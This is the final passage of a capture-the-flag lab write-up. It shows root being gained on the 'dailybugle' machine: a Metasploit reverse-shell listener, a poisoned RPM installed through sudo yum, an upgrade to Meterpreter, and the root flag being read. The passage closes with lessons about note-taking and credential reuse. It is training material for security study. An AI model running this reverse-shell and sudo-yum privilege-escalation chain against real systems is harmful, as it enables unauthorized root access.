Created package {:path=>"exploited-1.0-1.noarch.rpm"}
```

With the attack staged I, again, setup a listener in metasploit and then staged up the `shell_to_meterpreter` module to migrate to a stable shell in case yum timed out.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > use exploit/multi/handler 
[*] Using configured payload php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set payload generic/shell_reverse_tcp 
payload => generic/shell_reverse_tcp
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.182.144    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.182.144:4333 
msf5 exploit(multi/handler) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(multi/handler) > use 0
msf5 post(multi/manage/shell_to_meterpreter) > set lport 4333
lport => 4333
msf5 post(multi/manage/shell_to_meterpreter) > set session 3
session => 3
```

I then uploaded the poisoned RPM to the host over sftp and started a `yum localinstall`.

```bash
sftp> put exploited-1.0-1.noarch.rpm 
Uploading exploited-1.0-1.noarch.rpm to /home/jjameson/exploited-1.0-1.noarch.rpm
exploited-1.0-1.noarch.rpm
```

```bash
[jjameson@dailybugle ~]$ sudo yum localinstall -y exploited-1.0-1.noarch.rpm 
Loaded plugins: fastestmirror
```

It took quite a while to get through the yum plugins, yet eventially the session opened.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > [*] Command shell session 3 opened (10.10.182.144:4444 -> 10.10.162.223:36016) at 2020-11-27 23:06:30 +0000

msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.10.182.144    no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4333             yes       Port for payload to connect to.
   SESSION  3                yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.182.144:4333 
[*] Sending stage (980808 bytes) to 10.10.162.223
[*] Meterpreter session 5 opened (10.10.182.144:4333 -> 10.10.162.223:35216) at 2020-11-27 23:08:04 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions 4
[*] Starting interaction with 4...

msf5 post(multi/manage/shell_to_meterpreter) > sessions 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: no-user @ dailybugle (uid=0, gid=0, euid=0, egid=0)
meterpreter > shell
Process 4873 created.
Channel 1 created.
whoami
root
```

Success! With the session upgraded, I confirmed that I had a root account and quickly found the root flag under `/root/root.txt`

## Summary

This challenge really impressed onto me the importance of diligently taking notes. On my first pass I found, but failed to note, the root mysql user's password. This lead to me rabbitholing for hours trying to find a local exploit method to move from the apache user to `jjameson`. It took me walking away and taking stock of everything I knew before I thought to compile and run the known credentials against `jjameson`. The largest lesson I learned is to note everything, especially credentials, as user's might reuse the same credentials many times.
